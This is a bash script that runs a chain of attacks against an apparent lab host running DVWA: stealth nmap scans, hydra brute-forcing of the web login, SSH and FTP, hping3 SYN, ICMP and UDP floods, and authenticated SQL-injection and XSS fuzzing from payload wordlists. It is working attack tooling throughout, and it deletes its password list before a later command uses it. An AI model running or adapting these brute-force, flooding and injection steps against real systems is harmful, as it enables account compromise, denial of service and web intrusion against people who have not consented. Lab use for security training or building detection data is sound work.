#!/bin/bash

TARGET="192.168.122.109"
USERNAME="fruitto"
WORDLIST="wordlist_test.txt"

# Port Scan
sudo nmap -sS $TARGET
sudo nmap -sN $TARGET
sudo nmap -sX $TARGET

# Brute Force Attack
cat <<EOF >$WORDLIST
123456
password
admin123
qwerty
root123
111111
letmein
wrongpass1
wrongpass2
wrongpass3
P@ssword
rootroot
EOF

hydra -l $USERNAME -P $WORDLIST $TARGET http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect." -V
hydra -l $USERNAME -P $WORDLIST $TARGET ssh -t 4 -V
hydra -l $USERNAME -P $WORDLIST $TARGET ftp -t 4 -V
rm $WORDLIST

# Syn Flood (DoS)
# sudo hping3 -S -i u100 -p 80 --rand-source -c 10000 $TARGET
sudo hping3 -S -i u100 -p 80 -c 50000 $TARGET
# ICMP Flood (DoS)
# sudo hping3 --icmp -i u100 -d 1400 --rand-source -c 50000 $TARGET
sudo hping3 --icmp -i u100 -d 1400 -c 50000 $TARGET
# UDP Flood (DoS)
# sudo hping3 --udp -i u100 -p 53 --rand-source -d 1000 -c 50000 $TARGET
sudo hping3 --udp -i u100 -p 53 -d 1000 -c 50000 $TARGET

hydra -P $WORDLIST $TARGET http-get-form "/DVWA/vulnerabilities/sqli/:id=^PASS^&Submit=Submit:F=ID doesn't exist" -V

BASE_URL="http://$TARGET/DVWA"
DVWA_USER="admin"
DVWA_PASS="password"
SQL_WORDLIST="SQL-Injection-100-Wordlist.txt"
XSS_WORDLIST="XSS-100-Wordlist.txt"
INIT_PAGE=$(curl -s "$BASE_URL/login.php")
USER_TOKEN=$(echo "$INIT_PAGE" | grep -oP '(?<=name="user_token" value=")[^"]*')

RAW_COOKIES=$(curl -s -i \
  -d "username=$DVWA_USER&password=$DVWA_PASS&user_token=$USER_TOKEN&Login=Login" \
  "$BASE_URL/login.php" | grep -i "Set-Cookie")

SESSION_ID=$(echo "$RAW_COOKIES" | grep -oP 'PHPSESSID=\K[^;]*')

if [ -z "$SESSION_ID" ]; then
  echo "[!] Login failed."
  exit 1
fi

COOKIE_STR="security=low; PHPSESSID=$SESSION_ID"

curl -s -b "$COOKIE_STR" \
  -d "security=low&seclev_submit=Submit" \
  "$BASE_URL/security.php" >/dev/null

# --- SQL Injection Fuzzing ---
echo -e "\n[*] Starting SQL Injection fuzzing..."
while IFS= read -r PAYLOAD || [ -n "$PAYLOAD" ]; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "$COOKIE_STR" \
    "$BASE_URL/vulnerabilities/sqli/?id=${ENCODED}&Submit=Submit")

  echo "[SQLi] Payload: $PAYLOAD | Status: $RESPONSE"
done <"$SQL_WORDLIST"

# --- XSS Fuzzing ---
echo -e "\n[*] Starting XSS fuzzing..."
while IFS= read -r PAYLOAD || [ -n "$PAYLOAD" ]; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "$COOKIE_STR" \
    "$BASE_URL/vulnerabilities/xss_r/?name=${ENCODED}")

  echo "[XSS] Payload: $PAYLOAD | Status: $RESPONSE"
done <"$XSS_WORDLIST"
